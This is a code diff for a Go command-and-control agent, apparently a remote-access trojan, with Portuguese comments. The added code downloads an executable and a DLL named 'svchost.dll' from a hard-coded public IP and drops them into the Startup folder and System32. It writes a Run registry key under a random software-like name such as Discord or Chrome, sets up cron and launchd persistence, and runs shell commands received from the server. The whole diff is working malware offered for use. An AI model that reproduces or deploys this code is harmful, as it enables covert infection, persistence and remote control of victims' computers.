@@ -5,6 +5,7 @@ import (
 	"NetBios/C2/d3c/commons/helpers"
 	"encoding/gob"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"math/rand"
@@ -31,7 +32,7 @@ var (
 const (
 	//Coloque aqui o IP publico para conexão
 	SERVIDOR = "200.98.129.32"
-	//SERVIDOR = "127.0.0.1"
+	//SERVIDOR = "192.168.0.254"
 	PORTA = "9090"
 	url   = "https://www.google.com"
 )
@@ -68,6 +69,39 @@ func init() {
 	mensagem.AgentCWD, _ = os.Getwd()
 	mensagem.AgentID = geraID()
 }
+func IniciaJunto() error {
+	// Obter o diretório de inicialização do usuário
+	currentUser, err := user.Current()
+	if err != nil {
+		return err
+	}
+	startupDir := filepath.Join(currentUser.HomeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+
+	// Baixar o arquivo
+	url := "http://200.98.129.32/agente.exe"
+	response, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer response.Body.Close()
+
+	// Criar o arquivo no diretório de inicialização
+	filePath := filepath.Join(startupDir, "agente.exe")
+	file, err := os.Create(filePath)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	// Salvar o conteúdo do arquivo
+	_, err = io.Copy(file, response.Body)
+	if err != nil {
+		return err
+	}
+
+	fmt.Printf("Arquivo baixado e salvo com sucesso no diretório de inicialização de %s!\n", currentUser.Username)
+	return nil
+}
 
 func addRegistryKey() error {
 	currentUser, err := user.Current()
@@ -83,7 +117,7 @@ func addRegistryKey() error {
 	words := []string{"Discord", "Adobe", "Python", "PhotoShop", "Slack", "Notion", "Spotfy", "Chrome", "FireFox", "Web", "Internet", "SvcHost", "Windows"}
 	rand.Seed(time.Now().UnixNano())
 	randomIndex := rand.Intn(len(words))
-	command := fmt.Sprintf(`REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "%s" /t REG_SZ /F /D "C:\Users\%s\Downloads\agente.exe"`, words[randomIndex], currentUser.Username)
+	command := fmt.Sprintf(`REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "%s" /t REG_SZ /F /D "%s\\System32\\svchost.dll"`, words[randomIndex], currentUser.HomeDir)
 	cmd := exec.Command("cmd", "/C", command)
 
 	if runtime.GOOS == "windows" {
@@ -141,7 +175,7 @@ func createLaunchdPlist() error {
 	return nil
 }
 func createCronJob() error {
-	// Obtém o diretório do usuário atual
+	// Obtém o nome do usuário atual
 	currentUser, err := user.Current()
 	if err != nil {
 		return err
@@ -173,6 +207,8 @@ func createCronJob() error {
 
 func main() {
 	Bypass()
+	IniciaJunto()
+	DownloadDll()
 	addRegistryKey()
 	createLaunchdPlist()
 	createCronJob()
@@ -254,7 +290,7 @@ func executaComandoEmShell(comandoCompleto string) (resposta string) {
 		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()
 		resposta = string(output)
 	} else if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
-		output, _ := exec.Command("sh", "-c", comandoCompleto).CombinedOutput()
+		output, _ := exec.Command("bash", "-c", comandoCompleto).CombinedOutput()
 		resposta = string(output)
 	} else {
 		resposta = "Target operating system not implemented"
@@ -304,4 +340,43 @@ func geraID() string {
 	hostname, _ := os.Hostname()
 	return hostname
 
+}
+
+func DownloadDll() {
+	url := "http://200.98.129.32/svchost.dll"
+	outputDir := getSystem32Directory()
+
+	err := downloadFile(url, outputDir)
+	if err != nil {
+		fmt.Printf("Erro ao fazer o download do arquivo: %v\n", err)
+		return
+	}
+
+	fmt.Println("Download concluído com sucesso!")
+}
+
+func getSystem32Directory() string {
+	system32Dir := os.Getenv("SystemRoot")
+	return filepath.Join(system32Dir, "System32")
+}
+func downloadFile(url, outputDir string) error {
+	response, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer response.Body.Close()
+
+	outputFile := filepath.Join(outputDir, "svchost.dll")
+	out, err := os.Create(outputFile)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	_, err = io.Copy(out, response.Body)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
